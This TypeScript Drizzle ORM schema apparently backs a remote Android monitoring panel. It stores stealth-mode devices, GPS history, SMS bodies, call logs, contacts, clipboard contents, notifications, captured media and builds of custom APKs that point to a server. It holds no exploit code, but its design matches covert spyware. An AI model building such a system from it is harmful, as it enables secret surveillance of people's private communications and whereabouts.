import {
  int,
  mysqlEnum,
  mysqlTable,
  text,
  timestamp,
  varchar,
  boolean,
  decimal,
  json,
  bigint,
  index,
} from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow with role-based access control.
 */
export const users = mysqlTable(
  "users",
  {
    id: int("id").autoincrement().primaryKey(),
    openId: varchar("openId", { length: 64 }).notNull().unique(),
    name: text("name"),
    email: varchar("email", { length: 320 }).unique(),
    loginMethod: varchar("loginMethod", { length: 64 }),
    role: mysqlEnum("role", ["admin", "manager", "user", "viewer"]).default("viewer").notNull(),
    twoFactorEnabled: boolean("twoFactorEnabled").default(false).notNull(),
    twoFactorSecret: varchar("twoFactorSecret", { length: 255 }),
    isActive: boolean("isActive").default(true).notNull(),
    lastSignedIn: timestamp("lastSignedIn"),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  },
  (table) => ({
    emailIdx: index("email_idx").on(table.email),
    roleIdx: index("role_idx").on(table.role),
  })
);

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Permissions table - defines available permissions in the system.
 */
export const permissions = mysqlTable(
  "permissions",
  {
    id: int("id").autoincrement().primaryKey(),
    code: varchar("code", { length: 64 }).notNull().unique(),
    name: varchar("name", { length: 255 }).notNull(),
    description: text("description"),
    category: varchar("category", { length: 64 }).notNull(),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
  },
  (table) => ({
    codeIdx: index("code_idx").on(table.code),
    categoryIdx: index("category_idx").on(table.category),
  })
);

export type Permission = typeof permissions.$inferSelect;
export type InsertPermission = typeof permissions.$inferInsert;

/**
 * User permissions junction table - maps users to permissions.
 */
export const userPermissions = mysqlTable(
  "userPermissions",
  {
    id: int("id").autoincrement().primaryKey(),
    userId: int("userId").notNull(),
    permissionId: int("permissionId").notNull(),
    grantedAt: timestamp("grantedAt").defaultNow().notNull(),
    grantedBy: int("grantedBy"),
  },
  (table) => ({
    userIdIdx: index("userId_idx").on(table.userId),
    permissionIdIdx: index("permissionId_idx").on(table.permissionId),
  })
);

export type UserPermission = typeof userPermissions.$inferSelect;
export type InsertUserPermission = typeof userPermissions.$inferInsert;

/**
 * Android devices table - stores connected Android devices.
 */
export const devices = mysqlTable(
  "devices",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: varchar("deviceId", { length: 255 }).notNull().unique(),
    deviceName: varchar("deviceName", { length: 255 }).notNull(),
    manufacturer: varchar("manufacturer", { length: 255 }),
    model: varchar("model", { length: 255 }),
    androidVersion: varchar("androidVersion", { length: 64 }),
    imei: varchar("imei", { length: 64 }).unique(),
    phoneNumber: varchar("phoneNumber", { length: 20 }),
    ownerId: int("ownerId").notNull(),
    status: mysqlEnum("status", ["online", "offline", "inactive"]).default("offline").notNull(),
    lastSeen: timestamp("lastSeen"),
    isStealthMode: boolean("isStealthMode").default(false).notNull(),
    batteryLevel: int("batteryLevel"),
    storageUsed: bigint("storageUsed", { mode: "number" }),
    storageTotal: bigint("storageTotal", { mode: "number" }),
    metadata: json("metadata"),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    ownerIdIdx: index("ownerId_idx").on(table.ownerId),
    statusIdx: index("status_idx").on(table.status),
  })
);

export type Device = typeof devices.$inferSelect;
export type InsertDevice = typeof devices.$inferInsert;

/**
 * Device permissions table - maps devices to users with specific permissions.
 */
export const devicePermissions = mysqlTable(
  "devicePermissions",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    userId: int("userId").notNull(),
    permissionId: int("permissionId").notNull(),
    grantedAt: timestamp("grantedAt").defaultNow().notNull(),
    grantedBy: int("grantedBy"),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    userIdIdx: index("userId_idx").on(table.userId),
    permissionIdIdx: index("permissionId_idx").on(table.permissionId),
  })
);

export type DevicePermission = typeof devicePermissions.$inferSelect;
export type InsertDevicePermission = typeof devicePermissions.$inferInsert;

/**
 * Location history table - stores GPS tracking data.
 */
export const locationHistory = mysqlTable(
  "locationHistory",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    latitude: decimal("latitude", { precision: 10, scale: 8 }).notNull(),
    longitude: decimal("longitude", { precision: 11, scale: 8 }).notNull(),
    accuracy: decimal("accuracy", { precision: 10, scale: 2 }),
    altitude: decimal("altitude", { precision: 10, scale: 2 }),
    speed: decimal("speed", { precision: 10, scale: 2 }),
    bearing: decimal("bearing", { precision: 10, scale: 2 }),
    provider: varchar("provider", { length: 64 }),
    address: text("address"),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type LocationHistory = typeof locationHistory.$inferSelect;
export type InsertLocationHistory = typeof locationHistory.$inferInsert;

/**
 * SMS logs table - stores SMS message history.
 */
export const smsLogs = mysqlTable(
  "smsLogs",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
    messageBody: text("messageBody").notNull(),
    direction: mysqlEnum("direction", ["incoming", "outgoing"]).notNull(),
    timestamp: timestamp("timestamp").notNull(),
    isRead: boolean("isRead").default(false).notNull(),
    threadId: varchar("threadId", { length: 64 }),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    phoneNumberIdx: index("phoneNumber_idx").on(table.phoneNumber),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type SmsLog = typeof smsLogs.$inferSelect;
export type InsertSmsLog = typeof smsLogs.$inferInsert;

/**
 * Call logs table - stores call history.
 */
export const callLogs = mysqlTable(
  "callLogs",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
    contactName: varchar("contactName", { length: 255 }),
    callType: mysqlEnum("callType", ["incoming", "outgoing", "missed"]).notNull(),
    duration: int("duration").notNull(),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    phoneNumberIdx: index("phoneNumber_idx").on(table.phoneNumber),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type CallLog = typeof callLogs.$inferSelect;
export type InsertCallLog = typeof callLogs.$inferInsert;

/**
 * Contacts table - stores device contacts.
 */
export const contacts = mysqlTable(
  "contacts",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    name: varchar("name", { length: 255 }).notNull(),
    phoneNumber: varchar("phoneNumber", { length: 20 }),
    email: varchar("email", { length: 320 }),
    photoUrl: text("photoUrl"),
    notes: text("notes"),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    phoneNumberIdx: index("phoneNumber_idx").on(table.phoneNumber),
  })
);

export type Contact = typeof contacts.$inferSelect;
export type InsertContact = typeof contacts.$inferInsert;

/**
 * Installed applications table - stores list of apps on device.
 */
export const installedApps = mysqlTable(
  "installedApps",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    packageName: varchar("packageName", { length: 255 }).notNull(),
    appName: varchar("appName", { length: 255 }).notNull(),
    version: varchar("version", { length: 64 }),
    versionCode: int("versionCode"),
    isSystemApp: boolean("isSystemApp").default(false).notNull(),
    installTime: timestamp("installTime"),
    updateTime: timestamp("updateTime"),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    packageNameIdx: index("packageName_idx").on(table.packageName),
  })
);

export type InstalledApp = typeof installedApps.$inferSelect;
export type InsertInstalledApp = typeof installedApps.$inferInsert;

/**
 * Clipboard logs table - stores clipboard history.
 */
export const clipboardLogs = mysqlTable(
  "clipboardLogs",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    content: text("content").notNull(),
    contentType: varchar("contentType", { length: 64 }),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type ClipboardLog = typeof clipboardLogs.$inferSelect;
export type InsertClipboardLog = typeof clipboardLogs.$inferInsert;

/**
 * Notifications log table - stores notification history.
 */
export const notificationLogs = mysqlTable(
  "notificationLogs",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    appName: varchar("appName", { length: 255 }).notNull(),
    title: varchar("title", { length: 255 }),
    body: text("body"),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    appNameIdx: index("appName_idx").on(table.appName),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type NotificationLog = typeof notificationLogs.$inferSelect;
export type InsertNotificationLog = typeof notificationLogs.$inferInsert;

/**
 * Media files table - stores references to captured media.
 */
export const mediaFiles = mysqlTable(
  "mediaFiles",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    fileType: mysqlEnum("fileType", ["screenshot", "video", "audio", "photo"]).notNull(),
    fileName: varchar("fileName", { length: 255 }).notNull(),
    fileUrl: text("fileUrl").notNull(),
    fileSize: bigint("fileSize", { mode: "number" }),
    duration: int("duration"),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    fileTypeIdx: index("fileType_idx").on(table.fileType),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type MediaFile = typeof mediaFiles.$inferSelect;
export type InsertMediaFile = typeof mediaFiles.$inferInsert;

/**
 * Audit logs table - comprehensive logging of all system actions.
 */
export const auditLogs = mysqlTable(
  "auditLogs",
  {
    id: int("id").autoincrement().primaryKey(),
    userId: int("userId"),
    deviceId: int("deviceId"),
    action: varchar("action", { length: 255 }).notNull(),
    actionType: mysqlEnum("actionType", [
      "user_login",
      "user_logout",
      "user_created",
      "user_updated",
      "user_deleted",
      "permission_granted",
      "permission_revoked",
      "device_added",
      "device_removed",
      "device_monitored",
      "data_accessed",
      "data_exported",
      "settings_changed",
      "security_event",
    ]).notNull(),
    resourceType: varchar("resourceType", { length: 64 }),
    resourceId: varchar("resourceId", { length: 255 }),
    details: json("details"),
    ipAddress: varchar("ipAddress", { length: 45 }),
    userAgent: text("userAgent"),
    status: mysqlEnum("status", ["success", "failure"]).default("success").notNull(),
    timestamp: timestamp("timestamp").defaultNow().notNull(),
  },
  (table) => ({
    userIdIdx: index("userId_idx").on(table.userId),
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    actionTypeIdx: index("actionType_idx").on(table.actionType),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type AuditLog = typeof auditLogs.$inferSelect;
export type InsertAuditLog = typeof auditLogs.$inferInsert;

/**
 * APK builds table - stores APK generation history and configurations.
 */
export const apkBuilds = mysqlTable(
  "apkBuilds",
  {
    id: int("id").autoincrement().primaryKey(),
    buildId: varchar("buildId", { length: 64 }).notNull().unique(),
    createdBy: int("createdBy").notNull(),
    appName: varchar("appName", { length: 255 }).notNull(),
    packageName: varchar("packageName", { length: 255 }).notNull(),
    versionName: varchar("versionName", { length: 64 }),
    versionCode: int("versionCode"),
    iconUrl: text("iconUrl"),
    stealthMode: boolean("stealthMode").default(false).notNull(),
    ports: json("ports"),
    sslEnabled: boolean("sslEnabled").default(true).notNull(),
    serverUrl: text("serverUrl"),
    apkUrl: text("apkUrl"),
    fileSize: bigint("fileSize", { mode: "number" }),
    status: mysqlEnum("status", ["building", "ready", "failed", "expired"]).default("building").notNull(),
    downloadCount: int("downloadCount").default(0).notNull(),
    expiresAt: timestamp("expiresAt"),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  },
  (table) => ({
    buildIdIdx: index("buildId_idx").on(table.buildId),
    createdByIdx: index("createdBy_idx").on(table.createdBy),
    statusIdx: index("status_idx").on(table.status),
  })
);

export type ApkBuild = typeof apkBuilds.$inferSelect;
export type InsertApkBuild = typeof apkBuilds.$inferInsert;

/**
 * Geofences table - stores geofence definitions for location-based alerts.
 */
export const geofences = mysqlTable(
  "geofences",
  {
    id: int("id").autoincrement().primaryKey(),
    deviceId: int("deviceId").notNull(),
    name: varchar("name", { length: 255 }).notNull(),
    latitude: decimal("latitude", { precision: 10, scale: 8 }).notNull(),
    longitude: decimal("longitude", { precision: 11, scale: 8 }).notNull(),
    radius: decimal("radius", { precision: 10, scale: 2 }).notNull(),
    isActive: boolean("isActive").default(true).notNull(),
    alertOnEntry: boolean("alertOnEntry").default(true).notNull(),
    alertOnExit: boolean("alertOnExit").default(true).notNull(),
    createdAt: timestamp("createdAt").defaultNow().notNull(),
    updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  },
  (table) => ({
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
  })
);

export type Geofence = typeof geofences.$inferSelect;
export type InsertGeofence = typeof geofences.$inferInsert;

/**
 * Geofence events table - logs when devices enter/exit geofences.
 */
export const geofenceEvents = mysqlTable(
  "geofenceEvents",
  {
    id: int("id").autoincrement().primaryKey(),
    geofenceId: int("geofenceId").notNull(),
    deviceId: int("deviceId").notNull(),
    eventType: mysqlEnum("eventType", ["entry", "exit"]).notNull(),
    latitude: decimal("latitude", { precision: 10, scale: 8 }),
    longitude: decimal("longitude", { precision: 11, scale: 8 }),
    timestamp: timestamp("timestamp").notNull(),
    recordedAt: timestamp("recordedAt").defaultNow().notNull(),
  },
  (table) => ({
    geofenceIdIdx: index("geofenceId_idx").on(table.geofenceId),
    deviceIdIdx: index("deviceId_idx").on(table.deviceId),
    timestampIdx: index("timestamp_idx").on(table.timestamp),
  })
);

export type GeofenceEvent = typeof geofenceEvents.$inferSelect;
export type InsertGeofenceEvent = typeof geofenceEvents.$inferInsert;
